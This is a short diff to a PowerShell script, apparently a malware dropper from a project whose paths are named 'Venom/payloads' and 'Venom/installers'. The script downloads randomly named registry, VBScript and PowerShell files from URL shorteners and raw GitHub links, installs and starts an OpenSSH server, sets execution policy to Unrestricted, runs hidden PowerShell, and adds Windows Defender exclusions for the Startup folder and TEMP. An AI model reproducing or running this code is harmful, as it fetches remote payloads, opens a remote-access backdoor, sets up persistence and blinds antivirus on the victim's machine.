@@ -68,6 +68,8 @@ Invoke-WebRequest -UseBasicParsing -OutFile "QyjAaZDBbNPk.reg" -Uri "http://tiny
 Invoke-WebRequest -UseBasicParsing -OutFile "FoRAUwtxKkSB.vbs" -Uri "http://tiny.cc/s5cg001"
 Invoke-WebRequest -UseBasicParsing -OutFile "ZDaFvwjOosKx.vbs" -Uri "http://tiny.cc/y5cg001"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/tasks.ps1" -UseBasicParsing -OutFile "AEQKCPrkuifY.ps1"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/s.ps1" -UseBasicParsing -OutFile "ysAhVvSZMXDP.ps1
+
 
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
@@ -148,7 +150,6 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 # Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$tasks\AEQKCPrkuifY.ps1`"" -NoNewWindow -Wait
 
 cd $initial_dir
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/s.ps1" -UseBasicParsing -OutFile "ysAhVvSZMXDP.ps1
 
 Add-MpPreference -ExclusionPath "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 Add-MpPreference -ExclusionPath "$env:TEMP"
